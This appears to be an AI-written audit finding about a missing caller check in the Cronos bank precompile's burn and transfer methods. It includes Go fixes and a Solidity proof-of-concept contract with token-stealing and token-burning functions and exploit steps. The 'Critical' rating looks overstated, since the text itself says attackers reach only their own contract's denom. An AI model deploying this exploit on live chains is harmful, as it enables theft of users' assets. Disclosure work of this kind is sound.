Looking at the bank precompile in `x/cronos/keeper/precompiles/bank.go`, I found a critical authorization bypass that is a valid Cronos-native finding.

### Title
Unauthorized Burn and Transfer of Native Tokens via Missing Caller Authorization in Bank Precompile - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `burn` and `transfer` methods accept an arbitrary `from`/`addr` address from calldata without verifying that `contract.Caller()` is authorized to spend from that address. Any unprivileged EVM contract can burn or transfer `evm/<callerContract>` native tokens from any victim who holds them.

### Finding Description

The `burn` handler unpacks `args[0]` as the address to debit, then calls `SendCoinsFromAccountToModule(ctx, addr, ...)` with no check that `contract.Caller() == addr`: [1](#0-0) 

The variable is even named `recipient` (the mint-path name), masking that for the burn path it is the address being drained. The `transfer` handler similarly takes `sender` from `args[0]` and calls `bankKeeper.SendCoins(ctx, from, to, ...)` with no check that `contract.Caller() == from`: [2](#0-1) 

The denom is correctly scoped to `EVMDenom(contract.Caller())` — `"evm/" + callerContractAddress` — so the attacker can only affect tokens of their own contract's denom. But within that scope, **any victim address's balance is reachable**.

The intended usage pattern (from the integration test contract) passes `msg.sender` as the address argument: [3](#0-2) 

The precompile never enforces this constraint.

### Impact Explanation
**Critical.** An unprivileged attacker deploys a contract, mints `evm/<attackerContract>` tokens to victims (e.g., as DeFi rewards, collateral receipts, or LP shares), then calls `bank.burn(victim, amount)` or `bank.transfer(victim, attacker, amount)` to destroy or steal those tokens at will. This is an unauthorized burn/transfer of precompile-controlled native assets, matching the Critical impact tier.

### Likelihood Explanation
**Medium.** The attacker must first get victims to hold `evm/<attackerContract>` tokens. This is realistic whenever the attacker presents a DeFi protocol (yield farming, lending, AMM LP tokens) that issues these native tokens as receipts. Once victims hold them, the theft is a single EVM call with no further preconditions.

### Recommendation
For `burn`, verify `contract.Caller()` equals the address being debited:
```go
if common.BytesToAddress(addr.Bytes()) != contract.Caller() {
    return nil, errors.New("burn: caller is not authorized to burn from this address")
}
```
For `transfer`, verify `contract.Caller()` equals `from`:
```go
if common.BytesToAddress(from.Bytes()) != contract.Caller() {
    return nil, errors.New("transfer: caller is not authorized to transfer from this address")
}
```
Alternatively, implement an ERC-20-style allowance mechanism in the precompile.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function burn(address addr, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract BankPrecompileExploit {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Attacker mints evm/<this> tokens to victim as part of a "DeFi protocol"
    function issueTokens(address victim, uint256 amount) external {
        bank.mint(victim, amount);
        // victim now holds evm/<this> native tokens
    }

    // Step 2: Attacker steals victim's tokens — no approval needed
    function stealTokens(address victim, address attacker, uint256 amount) external {
        // from = victim (arbitrary calldata), no caller check in precompile
        bank.transfer(victim, attacker, amount);
    }

    // Alternative: destroy victim's tokens
    function destroyTokens(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

1. Deploy `BankPrecompileExploit` at `0xEXP`.
2. Call `issueTokens(victim, 1000)` — victim now holds `1000 evm/0xEXP` native tokens.
3. Call `stealTokens(victim, attacker, 1000)` — precompile executes `SendCoins(victim → attacker, 1000 evm/0xEXP)` with no authorization check.
4. Victim's balance is zero; attacker holds the tokens.
